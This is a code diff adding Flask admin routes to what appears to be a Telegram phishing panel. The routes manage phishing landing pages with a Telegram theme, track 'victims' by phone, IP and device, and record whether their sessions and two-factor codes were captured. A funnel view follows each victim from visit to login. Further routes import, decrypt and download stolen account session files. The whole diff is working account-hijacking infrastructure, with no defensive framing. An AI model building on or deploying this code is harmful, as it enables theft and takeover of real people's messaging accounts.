@@ -2853,3 +2853,534 @@ def api_listener_restart():
         return jsonify({'success': True, 'task_id': t.id})
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
+
+
+# ==========================================
+# HEALTH CHECK
+# ==========================================
+@admin_bp.route('/api/health')
+@login_required
+def api_health():
+    """Health check endpoint: checks DB connectivity and table existence."""
+    try:
+        from sqlalchemy import text
+        db.session.execute(text('SELECT 1'))
+        tables = []
+        for table_name in ['accounts', 'proxies', 'campaigns', 'landing_pages', 'victims', 'tracked_links', 'automations']:
+            try:
+                from sqlalchemy import text as sa_text
+                db.session.execute(sa_text(f'SELECT 1 FROM {table_name} LIMIT 1'))
+                tables.append({'table': table_name, 'exists': True})
+            except Exception:
+                tables.append({'table': table_name, 'exists': False})
+        return jsonify({'success': True, 'status': 'ok', 'tables': tables})
+    except Exception as e:
+        return jsonify({'success': False, 'status': 'error', 'error': str(e)}), 500
+
+
+# ==========================================
+# PROXY BULK CHECK
+# ==========================================
+@admin_bp.route('/proxies/bulk_check', methods=['POST'])
+@login_required
+@admin_required
+def proxies_bulk_check():
+    """Start mass proxy check via Celery."""
+    try:
+        from tasks.proxy_checker import check_all_proxies
+        task = check_all_proxies.delay()
+        log_action('bulk_check_proxies', 'Started mass proxy check')
+        return jsonify({'success': True, 'task_id': task.id})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+
+# ==========================================
+# SESSION DOWNLOAD
+# ==========================================
+@admin_bp.route('/accounts/<account_id>/download_session')
+@login_required
+def account_download_session(account_id):
+    """Download account session as SQLite .session file."""
+    account = db.session.get(Account, account_id)
+    if not account or not account.session_data:
+        flash('Аккаунт не найден или сессия отсутствует', 'danger')
+        return redirect(url_for('admin.accounts'))
+    try:
+        from utils.encryption import decrypt_session_data
+        from utils.session_converter import string_session_to_sqlite
+        import tempfile
+        session_str = decrypt_session_data(account.session_data)
+        safe_phone = (account.phone or 'unknown').lstrip('+').replace(' ', '').replace('-', '')
+        with tempfile.TemporaryDirectory() as tmpdir:
+            out_path = os.path.join(tmpdir, f'{safe_phone}.session')
+            ok = string_session_to_sqlite(session_str, out_path)
+            if ok and os.path.exists(out_path):
+                with open(out_path, 'rb') as f:
+                    data = f.read()
+                log_action('download_session', f'account={account_id}')
+                return send_file(
+                    io.BytesIO(data),
+                    as_attachment=True,
+                    download_name=f'{safe_phone}.session',
+                    mimetype='application/octet-stream',
+                )
+            else:
+                # Fallback: send StringSession as text
+                log_action('download_session', f'account={account_id} (string format)')
+                return send_file(
+                    io.BytesIO(session_str.encode('utf-8')),
+                    as_attachment=True,
+                    download_name=f'{safe_phone}.session',
+                    mimetype='text/plain',
+                )
+    except Exception as e:
+        log.error(f"account_download_session error: {e}")
+        flash(f'Ошибка: {e}', 'danger')
+        return redirect(url_for('admin.accounts'))
+
+
+# ==========================================
+# LANDING PAGES
+# ==========================================
+@admin_bp.route('/landings')
+@login_required
+def landings():
+    """List all landing pages."""
+    from models.landing_page import LandingPage
+    items = db.session.query(LandingPage).order_by(desc(LandingPage.created_at)).all()
+    return render_template('admin/landings.html', landings=items)
+
+
+@admin_bp.route('/api/landings')
+@login_required
+def api_landings_list():
+    from models.landing_page import LandingPage
+    items = db.session.query(LandingPage).order_by(desc(LandingPage.created_at)).all()
+    return jsonify({'success': True, 'landings': [{
+        'id': l.id, 'slug': l.slug, 'name': l.name,
+        'language': l.language, 'theme': l.theme, 'is_active': l.is_active,
+        'visits': l.visits, 'conversions': l.conversions,
+        'created_at': l.created_at.isoformat() if l.created_at else None,
+    } for l in items]})
+
+
+@admin_bp.route('/api/landings', methods=['POST'])
+@login_required
+@admin_required
+def api_landings_create():
+    from models.landing_page import LandingPage
+    data = request.get_json()
+    slug = data.get('slug', '').strip().lower().replace(' ', '-')
+    if not slug or not data.get('name'):
+        return jsonify({'success': False, 'error': 'slug and name are required'})
+    existing = db.session.query(LandingPage).filter(LandingPage.slug == slug).first()
+    if existing:
+        return jsonify({'success': False, 'error': 'Slug already exists'})
+    landing = LandingPage(
+        slug=slug,
+        name=data['name'],
+        html_content=data.get('html_content', ''),
+        css_content=data.get('css_content'),
+        js_content=data.get('js_content'),
+        language=data.get('language', 'uk'),
+        theme=data.get('theme', 'telegram'),
+        is_active=data.get('is_active', True),
+        created_by=current_user.id,
+    )
+    db.session.add(landing)
+    db.session.commit()
+    log_action('create_landing', f'slug={slug}')
+    return jsonify({'success': True, 'id': landing.id})
+
+
+@admin_bp.route('/api/landings/<int:landing_id>', methods=['PUT'])
+@login_required
+@admin_required
+def api_landings_update(landing_id):
+    from models.landing_page import LandingPage
+    landing = db.session.get(LandingPage, landing_id)
+    if not landing:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    data = request.get_json()
+    for field in ('name', 'html_content', 'css_content', 'js_content', 'language', 'theme', 'is_active'):
+        if field in data:
+            setattr(landing, field, data[field])
+    if 'slug' in data:
+        new_slug = data['slug'].strip().lower().replace(' ', '-')
+        existing = db.session.query(LandingPage).filter(
+            LandingPage.slug == new_slug, LandingPage.id != landing_id
+        ).first()
+        if existing:
+            return jsonify({'success': False, 'error': 'Slug already exists'})
+        landing.slug = new_slug
+    db.session.commit()
+    log_action('update_landing', f'id={landing_id}')
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/landings/<int:landing_id>', methods=['DELETE'])
+@login_required
+@admin_required
+def api_landings_delete(landing_id):
+    from models.landing_page import LandingPage
+    landing = db.session.get(LandingPage, landing_id)
+    if not landing:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    db.session.delete(landing)
+    db.session.commit()
+    log_action('delete_landing', f'id={landing_id}')
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/landings/<int:landing_id>/preview')
+@login_required
+def api_landings_preview(landing_id):
+    from models.landing_page import LandingPage
+    landing = db.session.get(LandingPage, landing_id)
+    if not landing:
+        return 'Not found', 404
+    html = landing.html_content or ''
+    if landing.css_content:
+        html = f'<style>{landing.css_content}</style>\n' + html
+    if landing.js_content:
+        html = html + f'\n<script>{landing.js_content}</script>'
+    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}
+
+
+# ==========================================
+# VICTIMS
+# ==========================================
+@admin_bp.route('/victims')
+@login_required
+def victims():
+    """List all victims."""
+    from models.victim import Victim
+    page = request.args.get('page', 1, type=int)
+    stmt = db.session.query(Victim).order_by(desc(Victim.first_visit_at))
+    total = stmt.count()
+    items = stmt.offset((page - 1) * 50).limit(50).all()
+    return render_template('admin/victims.html', victims=items, total=total, page=page)
+
+
+@admin_bp.route('/api/victims')
+@login_required
+def api_victims():
+    from models.victim import Victim
+    status_filter = request.args.get('status', '')
+    q = db.session.query(Victim).order_by(desc(Victim.first_visit_at))
+    if status_filter:
+        q = q.filter(Victim.status == status_filter)
+    items = q.limit(200).all()
+    return jsonify({'success': True, 'victims': [{
+        'id': v.id, 'phone': v.phone, 'ip': v.ip, 'country': v.country,
+        'device': v.device, 'os': v.os, 'browser': v.browser,
+        'status': v.status, 'session_captured': v.session_captured,
+        'twofa_captured': v.twofa_captured,
+        'first_visit_at': v.first_visit_at.isoformat() if v.first_visit_at else None,
+        'login_at': v.login_at.isoformat() if v.login_at else None,
+    } for v in items]})
+
+
+@admin_bp.route('/api/victims/funnel')
+@login_required
+def api_victims_funnel():
+    from models.victim import Victim
+    total = db.session.query(func.count(Victim.id)).scalar() or 0
+    code_sent = db.session.query(func.count(Victim.id)).filter(
+        Victim.status.in_(['code_sent', 'code_entered', 'logged_in', '2fa_passed'])
+    ).scalar() or 0
+    logged_in = db.session.query(func.count(Victim.id)).filter(
+        Victim.status.in_(['logged_in', '2fa_passed'])
+    ).scalar() or 0
+    twofa_passed = db.session.query(func.count(Victim.id)).filter(
+        Victim.status == '2fa_passed'
+    ).scalar() or 0
+    return jsonify({
+        'success': True,
+        'funnel': {
+            'visited': total,
+            'code_sent': code_sent,
+            'logged_in': logged_in,
+            '2fa_passed': twofa_passed,
+        }
+    })
+
+
+# ==========================================
+# TRACKED LINKS
+# ==========================================
+@admin_bp.route('/links')
+@login_required
+def links():
+    """Manage tracked links."""
+    from models.tracked_link import TrackedLink
+    items = db.session.query(TrackedLink).order_by(desc(TrackedLink.created_at)).all()
+    return render_template('admin/links.html', links=items)
+
+
+@admin_bp.route('/api/links')
+@login_required
+def api_links_list():
+    from models.tracked_link import TrackedLink
+    items = db.session.query(TrackedLink).order_by(desc(TrackedLink.created_at)).all()
+    return jsonify({'success': True, 'links': [{
+        'id': l.id, 'short_code': l.short_code, 'destination_url': l.destination_url,
+        'clicks': l.clicks, 'unique_clicks': l.unique_clicks,
+        'is_active': l.is_active,
+        'expires_at': l.expires_at.isoformat() if l.expires_at else None,
+        'created_at': l.created_at.isoformat() if l.created_at else None,
+    } for l in items]})
+
+
+@admin_bp.route('/api/links', methods=['POST'])
+@login_required
+@admin_required
+def api_links_create():
+    from models.tracked_link import TrackedLink
+    data = request.get_json()
+    short_code = data.get('short_code', '').strip()
+    if not short_code:
+        import random
+        import string
+        short_code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    destination_url = data.get('destination_url', '').strip()
+    if not destination_url:
+        return jsonify({'success': False, 'error': 'destination_url is required'})
+    existing = db.session.query(TrackedLink).filter(TrackedLink.short_code == short_code).first()
+    if existing:
+        return jsonify({'success': False, 'error': 'Short code already exists'})
+    expires_at = None
+    if data.get('expires_at'):
+        try:
+            expires_at = datetime.datetime.fromisoformat(data['expires_at'])
+        except Exception:
+            pass
+    link = TrackedLink(
+        short_code=short_code,
+        destination_url=destination_url,
+        campaign_id=data.get('campaign_id'),
+        is_active=data.get('is_active', True),
+        created_by=current_user.id,
+        expires_at=expires_at,
+    )
+    db.session.add(link)
+    db.session.commit()
+    log_action('create_link', f'short_code={short_code}')
+    return jsonify({'success': True, 'id': link.id, 'short_code': short_code})
+
+
+@admin_bp.route('/api/links/<int:link_id>', methods=['DELETE'])
+@login_required
+@admin_required
+def api_links_delete(link_id):
+    from models.tracked_link import TrackedLink
+    link = db.session.get(TrackedLink, link_id)
+    if not link:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    db.session.delete(link)
+    db.session.commit()
+    log_action('delete_link', f'id={link_id}')
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/links/<int:link_id>/stats')
+@login_required
+def api_links_stats(link_id):
+    from models.tracked_link import TrackedLink, LinkClick
+    link = db.session.get(TrackedLink, link_id)
+    if not link:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    clicks = db.session.query(LinkClick).filter(LinkClick.link_id == link_id).order_by(
+        desc(LinkClick.created_at)
+    ).limit(100).all()
+    return jsonify({'success': True, 'link': {
+        'id': link.id, 'short_code': link.short_code,
+        'clicks': link.clicks, 'unique_clicks': link.unique_clicks,
+    }, 'recent_clicks': [{
+        'ip': c.ip, 'country': c.country, 'device_type': c.device_type,
+        'os': c.os, 'browser': c.browser, 'referer': c.referer,
+        'created_at': c.created_at.isoformat() if c.created_at else None,
+    } for c in clicks]})
+
+
+# ==========================================
+# AUTOMATIONS
+# ==========================================
+@admin_bp.route('/automations')
+@login_required
+def automations():
+    """List and manage automations."""
+    from models.automation import Automation
+    items = db.session.query(Automation).order_by(desc(Automation.created_at)).all()
+    return render_template('admin/automations.html', automations=items)
+
+
+@admin_bp.route('/api/automations')
+@login_required
+def api_automations_list():
+    from models.automation import Automation
+    items = db.session.query(Automation).order_by(desc(Automation.created_at)).all()
+    return jsonify({'success': True, 'automations': [{
+        'id': a.id, 'name': a.name, 'trigger_type': a.trigger_type,
+        'is_active': a.is_active, 'runs_count': a.runs_count,
+        'last_run': a.last_run.isoformat() if a.last_run else None,
+        'steps': a.steps,
+        'created_at': a.created_at.isoformat() if a.created_at else None,
+    } for a in items]})
+
+
+@admin_bp.route('/api/automations', methods=['POST'])
+@login_required
+@admin_required
+def api_automations_create():
+    from models.automation import Automation
+    data = request.get_json()
+    if not data.get('name') or not data.get('trigger_type'):
+        return jsonify({'success': False, 'error': 'name and trigger_type are required'})
+    auto = Automation(
+        name=data['name'],
+        trigger_type=data['trigger_type'],
+        trigger_config=data.get('trigger_config'),
+        steps=data.get('steps', []),
+        is_active=data.get('is_active', True),
+        created_by=current_user.id,
+    )
+    db.session.add(auto)
+    db.session.commit()
+    log_action('create_automation', f'name={auto.name}')
+    return jsonify({'success': True, 'id': auto.id})
+
+
+@admin_bp.route('/api/automations/<int:auto_id>', methods=['PUT'])
+@login_required
+@admin_required
+def api_automations_update(auto_id):
+    from models.automation import Automation
+    auto = db.session.get(Automation, auto_id)
+    if not auto:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    data = request.get_json()
+    for field in ('name', 'trigger_type', 'trigger_config', 'steps', 'is_active'):
+        if field in data:
+            setattr(auto, field, data[field])
+    db.session.commit()
+    log_action('update_automation', f'id={auto_id}')
+    return jsonify({'success': True})
+
+
+@admin_bp.route('/api/automations/<int:auto_id>', methods=['DELETE'])
+@login_required
+@admin_required
+def api_automations_delete(auto_id):
+    from models.automation import Automation
+    auto = db.session.get(Automation, auto_id)
+    if not auto:
+        return jsonify({'success': False, 'error': 'Not found'}), 404
+    db.session.delete(auto)
+    db.session.commit()
+    log_action('delete_automation', f'id={auto_id}')
+    return jsonify({'success': True})
+
+
+# ==========================================
+# LIVE ANALYTICS - SSE
+# ==========================================
+@admin_bp.route('/api/live/stream')
+@login_required
+def api_live_stream():
+    """Server-Sent Events endpoint for live analytics."""
+    import json as json_mod
+    import time
+
+    def generate():
+        try:
+            from core.config import Config
+            import redis
+            r = redis.from_url(Config.CELERY_BROKER_URL or 'redis://localhost:6379/0')
+            pubsub = r.pubsub()
+            pubsub.subscribe('live_events')
+            yield f"data: {json_mod.dumps({'type': 'connected'})}\n\n"
+            start = time.time()
+            while time.time() - start < 30:
+                msg = pubsub.get_message(timeout=1.0)
+                if msg and msg['type'] == 'message':
+                    yield f"data: {msg['data'].decode('utf-8')}\n\n"
+                else:
+                    yield f": ping\n\n"
+        except Exception as e:
+            yield f"data: {json_mod.dumps({'type': 'error', 'message': str(e)})}\n\n"
+
+    from flask import Response
+    return Response(generate(), mimetype='text/event-stream',
+                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})
+
+
+@admin_bp.route('/api/live/stats')
+@login_required
+def api_live_stats():
+    """Get current live visitor stats from Redis."""
+    try:
+        from core.config import Config
+        import redis
+        r = redis.from_url(Config.CELERY_BROKER_URL or 'redis://localhost:6379/0')
+        keys = r.keys('live:visitor:*')
+        active_visitors = len(keys)
+        return jsonify({'success': True, 'active_visitors': active_visitors})
+    except Exception as e:
+        return jsonify({'success': True, 'active_visitors': 0, 'error': str(e)})
+
+
+# ==========================================
+# UPDATE import_sessions TO DETECT FORMAT
+# ==========================================
+@admin_bp.route('/accounts/import_sessions_v2', methods=['POST'])
+@login_required
+@admin_required
+def import_sessions_v2():
+    """Import sessions with auto-detection of StringSession vs SQLite format."""
+    files = request.files.getlist('sessions')
+    imported = 0
+    errors = []
+    for f in files:
+        try:
+            raw = f.read()
+            from utils.session_converter import detect_session_format, sqlite_session_to_string
+            fmt = detect_session_format(raw)
+            if fmt == 'sqlite':
+                import tempfile
+                with tempfile.NamedTemporaryFile(suffix='.session', delete=False) as tmp:
+                    tmp.write(raw)
+                    tmp_path = tmp.name
+                try:
+                    session_str = sqlite_session_to_string(tmp_path)
+                finally:
+                    try:
+                        os.unlink(tmp_path)
+                    except Exception:
+                        pass
+            else:
+                session_str = raw.decode('utf-8').strip()
+            if not session_str:
+                errors.append(f'{f.filename}: empty session')
+                continue
+            from utils.encryption import encrypt_session_data
+            acc = Account(
+                id=uuid.uuid4().hex,
+                phone=f'imported_{uuid.uuid4().hex[:8]}',
+                session_data=encrypt_session_data(session_str),
+                session_file=f.filename,
+                status='active'
+            )
+            db.session.add(acc)
+            db.session.commit()
+            try:
+                from tasks.session_checker import check_single_session_task
+                check_single_session_task.delay(acc.id)
+            except Exception:
+                pass
+            imported += 1
+        except Exception as e:
+            errors.append(f'{f.filename}: {e}')
+    log_action('import_sessions_v2', f'imported={imported}')
+    return jsonify({'success': True, 'imported': imported, 'errors': errors})
